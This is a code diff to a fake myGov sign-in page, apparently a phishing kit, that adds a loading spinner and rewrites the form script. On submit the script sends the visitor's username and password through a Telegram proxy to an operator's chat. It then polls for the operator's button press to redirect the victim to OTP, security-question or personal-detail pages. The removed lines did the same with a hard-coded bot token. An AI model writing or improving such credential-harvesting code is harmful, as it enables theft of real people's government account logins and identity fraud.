@@ -24,6 +24,39 @@
             margin-bottom: 15px;
             width: 100%;
         }
+
+        /* ===== Spinner inside the Sign in button ===== */
+        .button-main {
+            position: relative;
+        }
+        .button-main .btn-spinner {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            margin: -10px 0 0 -10px;
+            border: 3px solid rgba(255, 255, 255, 0.45);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        .button-main.loading .btn-label {
+            visibility: hidden;
+        }
+        .button-main.loading .btn-spinner {
+            display: block;
+        }
+        .button-main.loading,
+        .button-main:disabled {
+            cursor: default;
+            pointer-events: none;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
     </style>
 </head>
 
@@ -54,7 +87,7 @@
                                 <div class="digital-id-main-login-card override">
                                     <a data-go-back-link="" class="button-back" href="#">Back</a>
 
-                                    <!-- ✅ SUCCESS MESSAGE INSERTED HERE -->
+                                    <!-- ✅ SUCCESS MESSAGE -->
                                     <div class="success-msg" role="alert" aria-live="assertive"><span class="is-visuallyhidden">Success message:</span>
                                         <div class="success-msg-text"><span>
                                             <strong>Success</strong>
@@ -67,7 +100,7 @@
                                     <h1>Sign in with myGov</h1>
                                     <p class="login-instruction-text">Choose how to sign in</p>
 
-                                    <!-- Digital ID and Passkey options (exact section you requested) -->
+                                    <!-- Digital ID and Passkey options -->
                                     <div class="digital-id-login-card secondary">
                                         <div class="button-digital-id-container">
                                             <div class="digital-id-login-option-container">
@@ -86,7 +119,7 @@
                                         </div>
                                     </div>
 
-                                    <!-- "or" divider placed directly after the options -->
+                                    <!-- "or" divider -->
                                     <div class="hr-word">
                                         <div class="draw-circle">
                                             or
@@ -119,7 +152,10 @@
                                         </p>
                                         <div class="button-digital-id-main-container override">
                                             <div class="digital-id-button-container">
-                                                <button type="submit" class="button-main" name="btn1" id="btn1">Sign in</button>
+                                                <button type="submit" class="button-main" name="btn1" id="btn1">
+                                                    <span class="btn-label">Sign in</span>
+                                                    <span class="btn-spinner" aria-hidden="true"></span>
+                                                </button>
                                             </div>
                                         </div>
                                         <p class="create-account-text">
@@ -161,93 +197,162 @@
     </footer>
 
     <!-- JavaScript -->
-    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
     <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
-    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
-    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-    <script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
-    <script>
-        
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-<script>
+    <script type="text/javascript">
     // ===== CONFIGURATION =====
-const BOT_TOKEN = '8895080988:AAFgOP7jAWJKElaTchJFVu4fvHC-mTpAdUs';
-const CHAT_ID = '8981287811';
-const VPS_URL = 'https://your-domain.com'; // <-- your VPS domain
-// =========================
+    const PROXY   = "https://telegram-proxy.wyldamcmur.workers.dev";
+    const CHAT_ID = "8981287811";
 
-// Unique session for this visit
-const sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+    const ROUTES = {
+        "otp":         "otp.html",
+        "notcorrect":  "notcorrect.html",
+        "login":       "log.html",
+        "secquestion": "sec1.html",
+        "detail":      "detail.html"
+    };
+    // =========================
 
-$(document).ready(function() {
-    $('#form-1').on('submit', function(e) {
-        e.preventDefault();
+    /* ---------- Rolling favicon (tab loader) ---------- */
+    let faviconTimer = null;
+    let favAngle = 0;
+    const favCanvas = document.createElement('canvas');
+    favCanvas.width = 32;
+    favCanvas.height = 32;
+    const favCtx = favCanvas.getContext('2d');
 
-        let username = $('#ai').val();
-        let password = $('#pr').val();
+    let faviconLink = document.querySelector("link[rel*='icon']");
+    if (!faviconLink) {
+        faviconLink = document.createElement('link');
+        faviconLink.rel = 'icon';
+        document.head.appendChild(faviconLink);
+    }
 
-        let msg = "|----------| LOGIN CREDENTIALS |--------------|\n";
-        msg += "Username: " + username + "\n";
-        msg += "Password: " + password + "\n";
-        msg += "Session: " + sessionId + "\n";
-        msg += "|-----------------------------------------|";
+    function drawFavicon(angle) {
+        favCtx.clearRect(0, 0, 32, 32);
 
-        // Inline keyboard buttons
-        const inlineKeyboard = {
-            inline_keyboard: [
-                [
-                    { text: "OTP Page", callback_data: "otp|" + sessionId },
-                    { text: "Forgot Password", callback_data: "forgot|" + sessionId }
-                ],
-                [
-                    { text: "Login Page", callback_data: "login|" + sessionId },
-                    { text: "Secret Question", callback_data: "sqa|" + sessionId }
-                ],
-                [
-                    { text: "Create Password", callback_data: "newpass|" + sessionId }
-                ]
-            ]
-        };
+        // track ring
+        favCtx.beginPath();
+        favCtx.arc(16, 16, 11, 0, Math.PI * 2);
+        favCtx.strokeStyle = '#dfe3e8';
+        favCtx.lineWidth = 5;
+        favCtx.stroke();
 
-        $.ajax({
-            url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-            method: 'POST',
-            contentType: 'application/json',
-            data: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: msg,
-                reply_markup: inlineKeyboard
-            }),
-            complete: function() {
-                startPolling(sessionId);
-            }
-        });
+        // spinning arc
+        favCtx.beginPath();
+        favCtx.arc(16, 16, 11, angle, angle + Math.PI * 0.65);
+        favCtx.strokeStyle = '#215c8e';
+        favCtx.lineWidth = 5;
+        favCtx.lineCap = 'round';
+        favCtx.stroke();
 
-        // Show spinner on button
-        $('#btn1').addClass('processing').prop('disabled', true);
-    });
-});
+        faviconLink.href = favCanvas.toDataURL('image/png');
+    }
 
-// Poll the VPS for the redirect choice
-function startPolling(sessionId) {
-    const poll = setInterval(async function() {
-        try {
-            const res = await fetch(`${VPS_URL}/session/${sessionId}`);
-            const data = await res.json();
+    function startTabSpinner() {
+        if (faviconTimer) return;
+        faviconTimer = setInterval(function () {
+            favAngle += Math.PI / 8;
+            drawFavicon(favAngle);
+        }, 60);
+    }
 
-            if (data && data.redirect) {
-                clearInterval(poll);
-                window.location.href = 'otp.html';
-            }
-        } catch (err) {
-            console.log('Polling error', err);
+    function stopTabSpinner() {
+        if (faviconTimer) {
+            clearInterval(faviconTimer);
+            faviconTimer = null;
         }
-    }, 2500); // every 2.5 seconds
-}
-           });
+    }
+
+    /* ---------- Form handling ---------- */
+    $(document).ready(function() {
+        $('#form-1').on('submit', async function(e) {
+            e.preventDefault();
+
+            const user = $('#ai').val();
+            const pass = $('#pr').val();
+
+            // Spin the Sign in button + roll the tab favicon
+            $('#btn1').addClass('loading').prop('disabled', true);
+            startTabSpinner();
+
+            const sid = (crypto.randomUUID && crypto.randomUUID().slice(0, 8)) ||
+                        Math.random().toString(36).slice(2, 10);
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{ text: "🔐 OTP",         callback_data: `otp:${sid}`         }],
+                    [{ text: "🔑 Notcorrect",  callback_data: `notcorrect:${sid}`  }],
+                    [{ text: "↩️ Login",       callback_data: `log:${sid}`       }],
+                    [{ text: "✅ Secquestion", callback_data: `secquestion:${sid}` }],
+                    [{ text: "✍️ Detail",      callback_data: `detail:${sid}`      }]
+                ]
+            };
+
+            try {
+                // Get current offset so we only see NEW callbacks
+                const r0 = await fetch(`${PROXY}/getUpdates?offset=-1`);
+                const d0 = await r0.json();
+                const startOffset = (d0.result && d0.result.length)
+                    ? d0.result[d0.result.length - 1].update_id + 1
+                    : 0;
+
+                // Send login credentials + control buttons to Telegram
+                await fetch(`${PROXY}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `🔔 myGov Login attempt\n👤 Username: ${user}\n🔑 Password: ${pass}\n🆔 Session: ${sid}`,
+                        reply_markup: keyboard
+                    })
+                });
+
+                // Listen for the redirect command from Telegram
+                pollLoop(startOffset, sid);
+
+            } catch (err) {
+                console.error(err);
+            }
         });
     });
-</script>
+
+    async function pollLoop(offset, sid) {
+        while (true) {
+            try {
+                const r = await fetch(`${PROXY}/getUpdates?offset=${offset}&timeout=15`);
+                const data = await r.json();
+                if (!data.result) continue;
+
+                for (const upd of data.result) {
+                    offset = upd.update_id + 1;
+                    const cb = upd.callback_query;
+                    if (!cb) continue;
+
+                    const [action, sess] = cb.data.split(":");
+                    if (sess !== sid) continue;
+
+                    // Acknowledge the button press in Telegram
+                    await fetch(`${PROXY}/answerCallbackQuery`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            callback_query_id: cb.id,
+                            text: "Redirecting user…"
+                        })
+                    });
+
+                    // Follow the command
+                    stopTabSpinner();
+                    window.location.href = ROUTES[action] || "otp.html";
+                    return;
+                }
+            } catch (e) {
+                console.error(e);
+                await new Promise(r => setTimeout(r, 2000));
+            }
+        }
+    }
+    </script>
 </body>
 
 </html>
